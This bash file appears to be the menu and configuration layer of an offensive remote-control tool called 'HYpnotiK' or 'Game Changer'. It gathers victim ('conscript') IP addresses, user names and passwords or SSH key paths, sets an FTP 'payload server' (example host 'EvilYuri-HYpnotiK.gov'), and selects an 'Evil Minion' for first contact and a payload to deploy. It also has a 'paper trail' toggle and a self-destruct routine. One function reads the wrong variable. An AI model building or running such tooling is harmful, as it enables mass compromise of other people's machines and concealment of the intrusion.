    set_source_file "$FILE_PATH"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_PATH${RESET}) as"\
            "(${BLUE}Game Changer${RESET}) source file."
    else
        ok_msg "Successfully set source file (${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_search_criteria () {
   echo; info_msg "Specify (${RED}${SCRIPT_NAME}${RESET}) record search criteria"\
        "or (${MAGENTA}.back${RESET}).
        "
    local SEARCH_VALUES=(
        'identifier' 'address' 'port' 'key' 'user' 'size' 'all'
    )
    local SCRITERIA=`fetch_selection_from_user 'ActionTarget' ${SEARCH_VALUES[@]}`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    set_search_criteria "$SCRITERIA"
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong. Could not set record search criteria"\
            "(${RED}$SCRITERIA${RESET})."
    else
        ok_msg "Successfully set record search criteria"\
            "(${GREEN}$SCRITERIA${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_target () {
    echo; info_msg "Specify (${RED}${SCRIPT_NAME}${RESET}) action target"\
        "or (${MAGENTA}.back${RESET}).
        "
    local TARGET_VALUES=( 'all' 'group' 'specific' 'attribute' )
    local ATARGET=`fetch_selection_from_user 'ActionTarget' ${TARGET_VALUES[@]}`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    set_target "$ATARGET"
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong. Could not set action target"\
            "(${RED}$ATARGET${RESET})."
    else
        ok_msg "Successfully set action target"\
            "(${GREEN}$ATARGET${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_connection_protocol () {
    echo; info_msg "Specify conscript connection protocol"\
        "or (${MAGENTA}.back${RESET}).
        "
    local CNX_PROTOCOL=`fetch_selection_from_user 'Protocol' 'ssh' 'raw'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    set_protocol "$CNX_PROTOCOL"
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set conscript connection protocol"\
            "(${RED}$CNX_PROTOCOL${RESET})."
    else
        ok_msg "Successfully set conscript connection protocol"\
            "(${GREEN}$CNX_PROTOCOL${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_mission_instruction () {
    echo; info_msg "Type conscript mission instruction"\
        "or (${MAGENTA}.back${RESET})."
    local MISSION=`fetch_data_from_user 'MissionInstruction'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_mission_instruction "$MISSION"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set conscript mission instruction"\
            "(${RED}$MISSION${RESET})."
    else
        ok_msg "Successfully set conscript mission instruction"\
            "(${GREEN}$MISSION${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_group_size () {
    echo; info_msg "Type group size or (${MAGENTA}.back${RESET})."
    local GSIZE=`fetch_data_from_user 'GroupSize'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_group_size "$GSIZE"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set group size"\
            "(${RED}$GSIZE${RESET})."
    else
        ok_msg "Successfully set group size"\
            "(${GREEN}$GSIZE${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_port_number () {
    echo; info_msg "Type port number"\
        "or (${MAGENTA}.back${RESET})."
    local PORT_NO=`fetch_data_from_user 'PortNumber'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_port_number "$PORT_NO"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set port number"\
            "(${RED}$PORT_NO${RESET})."
    else
        ok_msg "Successfully set port number"\
            "(${GREEN}$PORT_NO${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_victim_user () {
    echo; info_msg "Type conscript user name"\
        "or (${MAGENTA}.back${RESET})."
    local CONSCRIPT_USR=`fetch_data_from_user 'ConscriptUser'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_victim_user "$CONSCRIPT_USR"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set conscript user"\
            "(${RED}$CONSCRIPT_USR${RESET})."
    else
        ok_msg "Successfully set conscript user"\
            "(${GREEN}$CONSCRIPT_USR${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_victim_key () {
    echo; info_msg "Type conscript key (user-password | ssh-key-path)"\
        "or (${MAGENTA}.back${RESET})."
    local CONSCRIPT_KEY=`fetch_data_from_user 'ConscriptKey'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_victim_key "$CONSCRIPT_KEY"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set conscript key"\
            "(${RED}$CONSCRIPT_KEY${RESET})."
    else
        ok_msg "Successfully set conscript key"\
            "(${GREEN}$CONSCRIPT_KEY${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_victim_archive () {
    display_available_victim_archives
    echo; info_msg "Type conscript archive identifier"\
        "or (${MAGENTA}.back${RESET})."
    local CONSCRIPT_ARCHV=`fetch_data_from_user 'ConArchive'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_victim_archive "$CONSCRIPT_ARCHV"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set conscript archive"\
            "(${RED}$CONSCRIPT_ARCHV${RESET})."
    else
        ok_msg "Successfully set conscript archive"\
            "(${GREEN}$CONSCRIPT_ARCHV${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_ftp_server_address () {
    echo; info_msg "Type address (IPv4 | DNS) of FTP Payload Server"\
        "or (${MAGENTA}.back${RESET})."
    symbol_msg "${BLUE}EXAMPLE${RESET}" "(127.0.0.1 | 123.211.222.233 | http://EvilYuri-HYpnotiK.gov)"
    local FTP_SRV_ADDR=`fetch_data_from_user 'FTPAddress'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_ftp_server_address "$FTP_SRV_ADDR"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set FTP Payload Server address"\
            "(${RED}$FTP_SRV_ADDR${RESET})."
    else
        ok_msg "Successfully set FTP Payload Server address"\
            "(${GREEN}$FTP_SRV_ADDR${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_victim_addresses () {
    echo; info_msg "Type conscript IPv4 addresses separated by commas"\
        "or (${MAGENTA}.back${RESET})."
    symbol_msg "${BLUE}EXAMPLE${RESET}" "127.0.0.1,73.109.42.11,..."
    local VICTIM_ADDRS=`fetch_data_from_user 'ConscriptIPv4'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_victim_addresses "$VICTIM_ADDRS"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set conscript IPv4 addresses"\
            "(${RED}$VICTIM_ADDRS${RESET})."
    else
        ok_msg "Successfully set conscript IPv4 addresses"\
            "(${GREEN}$VICTIM_ADDRS${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_group_labels () {
    echo; info_msg "Type conscript group labels as aliases separated by commas"\
        "or (${MAGENTA}.back${RESET})."
    symbol_msg "${BLUE}EXAMPLE${RESET}" "Group1,Group2,Group3,..."
    local GROUP_LBLS=`fetch_data_from_user 'ConscriptGroups'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_group_labels "$GROUP_LABELS"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set conscript group labels (${RED}$GROUP_LABELS${RESET})."
    else
        ok_msg "Successfully set conscript group labels"\
            "(${GREEN}$GROUP_LABELS${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_minion_directory () {
    echo; info_msg "Type absolute directory path or (${MAGENTA}.back${RESET})."
    while :
    do
        local DIR_PATH=`fetch_data_from_user 'DirectoryPath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_directory_exists "$DIR_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "Directory (${RED}$DIR_PATH${RESET}) does not exists."
            echo
        fi; break
    done
    set_minion_directory "$DIR_PATH"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$DIR_PATH${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) minion directory."
    else
        ok_msg "Successfully set minion directory (${GREEN}$DIR_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_payload_directory () {
    echo; info_msg "Type absolute directory path or (${MAGENTA}.back${RESET})."
    while :
    do
        local DIR_PATH=`fetch_data_from_user 'DirectoryPath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_directory_exists "$DIR_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "Directory (${RED}$DIR_PATH${RESET}) does not exists."
            echo
        fi; break
    done
    set_payload_directory "$DIR_PATH"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$DIR_PATH${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) payload directory."
    else
        ok_msg "Successfully set payload directory (${GREEN}$DIR_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_template_directory () {
    echo; info_msg "Type absolute directory path or (${MAGENTA}.back${RESET})."
    while :
    do
        local DIR_PATH=`fetch_data_from_user 'DirectoryPath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_directory_exists "$DIR_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "Directory (${RED}$DIR_PATH${RESET}) does not exists."
            echo
        fi; break
    done
    set_template_directory "$DIR_PATH"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$DIR_PATH${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) template directory."
    else
        ok_msg "Successfully set template directory (${GREEN}$DIR_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_ftp_server_config_template () {
    local CONFIG_FILES=(
        `fetch_all_directory_files "${MD_DEFAULT['template-dir']}" | grep '.conf'`
    )
    local FILE_NAMES=()
    for file_path in ${CONFIG_FILES[@]}; do
        local TRIMMED=`fetch_file_name_from_path "$file_path"`
        local FILE_NAMES=( ${FILE_NAMES[@]} "$TRIMMED" )
    done
    echo; info_msg "Select template configuration file for FTP payload server -
    "
    local FILE_NAME=`fetch_selection_from_user 'FTPConfig' \
        ${FILE_NAMES[@]}`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_ftp_config_template "${MD_DEFAULT['template-dir']}/${FILE_NAME}"
    echo; return 0
}

function action_set_evil_minion () {
    local MINION_FILES=(
        `fetch_all_directory_files "${MD_DEFAULT['minion-dir']}"`
    )
    local FILE_NAMES=()
    for file_path in ${MINION_FILES[@]}; do
        local TRIMMED=`fetch_file_name_from_path "$file_path"`
        local FILE_NAMES=( ${FILE_NAMES[@]} "$TRIMMED" )
    done
    echo; info_msg "Select Evil Minion to use for first contact -
    "
    local FILE_NAME=`fetch_selection_from_user 'EvilMinion' \
        ${FILE_NAMES[@]}`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_evil_minion "${MD_DEFAULT['minion-dir']}/${FILE_NAME}"
    echo; return 0
}

function action_set_hypnotik_payload () {
    local PAYLOAD_FILES=(
        `fetch_all_directory_files "${MD_DEFAULT['payload-dir']}"`
    )
    local FILE_NAMES=()
    for file_path in ${PAYLOAD_FILES[@]}; do
        local TRIMMED=`fetch_file_name_from_path "$file_path"`
        local FILE_NAMES=( ${FILE_NAMES[@]} "$TRIMMED" )
    done
    echo; info_msg "Select HYpnotiK Conscript Payload -
    "
    local FILE_NAME=`fetch_selection_from_user 'ConscriptPayload' \
        ${FILE_NAMES[@]}`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_hypnotik_payload "${MD_DEFAULT['payload-dir']}/${FILE_NAME}"
    echo; return 0
}

function action_set_foreground_flag () {
    echo; case "${MD_DEFAULT['foreground-flag']}" in
        'on'|'On'|'ON')
            info_msg "Forground flag is (${GREEN}ON${RESET})"
            local QA="Are you sure you want to switch it (${RED}OFF${RESET})? Y/N>"
            fetch_ultimatum_from_user "$QA"
            if [ $? -ne 0 ]; then
                info_msg "Aborting action!"
                return 0
            fi
            action_set_foreground_off
            ;;
        'off'|'Off'|'OFF')
            info_msg "Forground flag is (${RED}OFF${RESET})"
            local QA="Are you sure you want to switch it (${GREEN}ON${RESET})? Y/N>"
            fetch_ultimatum_from_user "$QA"
            if [ $? -ne 0 ]; then
                info_msg "Aborting action!"
                return 0
            fi
            action_set_foreground_on
            ;;
        *)
            info_msg "Foreground flag is not set!"
            local QA="Are you sure you want to switch it (${GREEN}ON${RESET})? Y/N>"
            fetch_ultimatum_from_user "$QA"
            if [ $? -ne 0 ]; then
                info_msg "Aborting action!"
                return 0
            fi
            action_set_foreground_on
            ;;
    esac
    return $?
}

function action_set_papertrail_flag () {
    echo; case "${MD_DEFAULT['papertrain-flag']}" in
        'on'|'On'|'ON')
            info_msg "Paper Trail flag is (${GREEN}ON${RESET})"
            local QA="Are you sure you want to switch it (${RED}OFF${RESET})? Y/N>"
            fetch_ultimatum_from_user "$QA"
            if [ $? -ne 0 ]; then
                info_msg "Aborting action!"
                return 0
            fi
            action_set_papertrail_off
            ;;
        'off'|'Off'|'OFF')
            info_msg "Paper Trail flag is (${RED}OFF${RESET})"
            local QA="Are you sure you want to switch it (${GREEN}ON${RESET})? Y/N>"
            fetch_ultimatum_from_user "$QA"
            if [ $? -ne 0 ]; then
                info_msg "Aborting action!"
                return 0
            fi
            action_set_papertrail_on
            ;;
        *)
            info_msg "Paper Trail flag is not set!"
            local QA="Are you sure you want to switch it (${GREEN}ON${RESET})? Y/N>"
            fetch_ultimatum_from_user "$QA"
            if [ $? -ne 0 ]; then
                info_msg "Aborting action!"
                return 0
            fi
            action_set_papertrail_on
            ;;
    esac
    return $?
}

function action_set_foreground_on () {
    set_foreground_flag 'on'
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) foreground flag"\
            "to (${GREEN}ON${RESET})."
    else
        ok_msg "Succesfully set (${BLUE}$SCRIPT_NAME${RESET}) foreground flag"\
            "to (${GREEN}ON${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_foreground_off () {
    set_foreground_flag 'off'
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) foreground flag"\
            "to (${RED}OFF${RESET})."
    else
        ok_msg "Succesfully set (${BLUE}$SCRIPT_NAME${RESET}) foreground flag"\
            "to (${RED}OFF${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_papertrail_on () {
    set_papertrail_flag 'on'
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) papertrail flag"\
            "to (${GREEN}ON${RESET})."
    else
        ok_msg "Succesfully set (${BLUE}$SCRIPT_NAME${RESET}) papertrail flag"\
            "to (${GREEN}ON${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_papertrail_off () {
    set_papertrail_flag 'off'
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) papertrail flag"\
            "to (${RED}OFF${RESET})."
    else
        ok_msg "Succesfully set (${BLUE}$SCRIPT_NAME${RESET}) papertrail flag"\
            "to (${RED}OFF${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_safety_flag () {
    echo; case "$MD_SAFETY" in
        'on'|'On'|'ON')
            info_msg "Safety is (${GREEN}ON${RESET}), switching to (${RED}OFF${RESET}) -"
            action_set_safety_off
            ;;
        'off'|'Off'|'OFF')
            info_msg "Safety is (${RED}OFF${RESET}), switching to (${GREEN}ON${RESET}) -"
            action_set_safety_on
            ;;
        *)
            info_msg "Safety not set, switching to (${GREEN}ON${RESET}) -"
            action_set_safety_on
            ;;
    esac
    return $?
}

function action_install_project_dependencies () {
    action_install_dependencies 'apt'
    return $?
}

function action_project_self_destruct () {
    echo; info_msg "You are about to delete all (${RED}$SCRIPT_NAME${RESET})"\
        "project files from directory (${RED}${MD_DEFAULT['project-path']}${RESET})."
    fetch_ultimatum_from_user "${YELLOW}Are you sure about this? Y/N${RESET}"
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    check_safety_on
    if [ $? -ne 0 ]; then
        echo; warning_msg "Safety is (${GREEN}ON${RESET})!"\
            "Aborting self destruct sequence."
        return 0
    fi; echo
    symbol_msg "${RED}$SCRIPT_NAME${RESET}" "Initiating self destruct sequence!"
    action_self_destruct
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "(${RED}$SCRIPT_NAME${RESET}) self destruct sequence failed!"
    else
        ok_msg "Destruction complete!"\
            "Project (${GREEN}$SCRIPT_NAME${RESET}) removed from system."
    fi
    return $EXIT_CODE
}

# CODE DUMP

